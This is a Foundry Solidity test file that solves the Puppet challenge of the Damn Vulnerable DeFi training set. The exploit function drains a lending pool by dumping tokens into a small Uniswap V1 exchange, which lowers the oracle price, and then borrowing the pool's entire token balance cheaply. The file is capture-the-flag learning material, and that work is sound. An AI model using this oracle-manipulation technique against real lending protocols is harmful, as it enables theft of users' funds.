// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import {stdError, stdCheats} from "forge-std/stdlib.sol";

import {Math} from "openzeppelin-contracts/utils/math/Math.sol";

import {Utilities} from "../utils/Utilities.sol";
import {BaseTest} from "../BaseTest.sol";

import "../../DamnValuableToken.sol";
import "../../uniswap-v1/IUniswapV1Exchange.sol";
import "../../uniswap-v1/IUniswapV1Factory.sol";
import "../../puppet/PuppetPool.sol";

contract PuppetTest is BaseTest, stdCheats {

    uint256 UNISWAP_INITIAL_TOKEN_RESERVE = 10 ether; 
    uint256 UNISWAP_INITIAL_ETH_RESERVE = 10 ether; 

    uint256 ATTACKER_INITIAL_TOKEN_BALANCE = 1000 ether; 
    uint256 ATTACKER_INITIAL_ETH_BALANCE = 25 ether;

    uint256 POOL_INITIAL_TOKEN_BALANCE = 100000 ether; 

    DamnValuableToken token;
    PuppetPool lendingPool;
    IUniswapV1Exchange uniswapExchange;


    address attacker;

    constructor() {
        string[] memory labels = new string[](1);
        labels[0] = "Attacker";

        preSetup(1, ATTACKER_INITIAL_ETH_BALANCE, labels);
    }

    function setUp() public override {
        super.setUp();
        vm.label(address(this), "deployer");
        // vm.deal(address(this), null);

        attacker = users[0];


        // check that the attacker has only 25 ether
        assertEq(attacker.balance, ATTACKER_INITIAL_ETH_BALANCE);

        // Deploy token to be traded in Uniswap
        token = new DamnValuableToken();
        vm.label(address(token), "DamnValuableToken");

        // Deploy a exchange that will be used as the factory template
        address _exchangeTemplate = deployCode("artifacts/build-uniswap-v1/UniswapV1Exchange.json");
        IUniswapV1Exchange exchangeTemplate = IUniswapV1Exchange(_exchangeTemplate);

        // Deploy factory, initializing it with the address of the template exchange
        address _uniswapFactory = deployCode("artifacts/build-uniswap-v1/UniswapV1Factory.json");
        IUniswapV1Factory uniswapFactory = IUniswapV1Factory(_uniswapFactory);
        uniswapFactory.initializeFactory(address(exchangeTemplate));

        // Create a new exchange for the token, and retrieve the deployed exchange's address
        address exchangeAddress = uniswapFactory.createExchange{gas: 1e6}(address(token));
        uniswapExchange = IUniswapV1Exchange(exchangeAddress);
        vm.label(address(uniswapExchange), "UniswapV1Exchange");

        // Deploy the lending pool
        lendingPool = new PuppetPool(address(token), address(uniswapExchange));
        vm.label(address(lendingPool), "PuppetPool");

        // Waring time of 1 second because foundry starts with block.timestamp = 0
        vm.warp(1);

        // Add initial token and ETH liquidity to the pool
        token.approve(address(uniswapExchange), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapExchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE, gas: 1e6}(
            0, // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            block.timestamp * 2 // deadline
        );

        // Ensure Uniswap exchange is working as expected
        assertEq(uniswapExchange.getTokenToEthInputPrice{gas: 1e6}(1 ether), calculateTokenToEthInputPrice(1 ether, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE));

        // Setup initial token balances of pool and attacker account
        token.transfer(attacker, ATTACKER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
        assertEq(lendingPool.calculateDepositRequired(1 ether), 2 ether);
        assertEq(lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE), POOL_INITIAL_TOKEN_BALANCE * 2);
    }

    // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
    function calculateTokenToEthInputPrice(uint tokensSold, uint tokensInReserve, uint etherInReserve) internal pure returns (uint) {
        return tokensSold * 997 ether * etherInReserve / ((tokensInReserve * 1000 ether) + (tokensSold * 997 ether));
    }

    
    function test_Exploit() public {
        runTest();
    }

    function exploit() internal override {
        /** CODE YOUR EXPLOIT HERE */

        uint256 deadline = block.timestamp * 2;
        
        vm.startPrank(attacker);

        // Approve the exchange for the whole amount of token
        token.approve(address(uniswapExchange), type(uint256).max);

        // Sell token all the token to get ETH
        // Doing this the price of the token will lower and the Pool `_computeOraclePrice` will return a low value
        // Allowing us to borrow at a cheaper price
        uniswapExchange.tokenToEthSwapInput(token.balanceOf(attacker), 1, deadline);

        // Calculate how much we should pay to borrow a token
        uint256 ethToBorrowOneToken = lendingPool.calculateDepositRequired(1 ether);

        // Calc how much we can borrow
        uint256 tokenWeCanBorrow = (attacker.balance/ethToBorrowOneToken) * 10 ** 18;

        // Get the max borrowable tokekns from the pool
        uint256 maxTokenToBorrow = Math.min(token.balanceOf(address(lendingPool)), tokenWeCanBorrow);

        // Borrow all the token draining the pool
        lendingPool.borrow{value: attacker.balance}(maxTokenToBorrow);

        vm.stopPrank();
    }

    function success() internal override {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool   
        assertEq(token.balanceOf(address(lendingPool)), 0);
        assertEq(token.balanceOf(address(attacker)), POOL_INITIAL_TOKEN_BALANCE);
    }
}
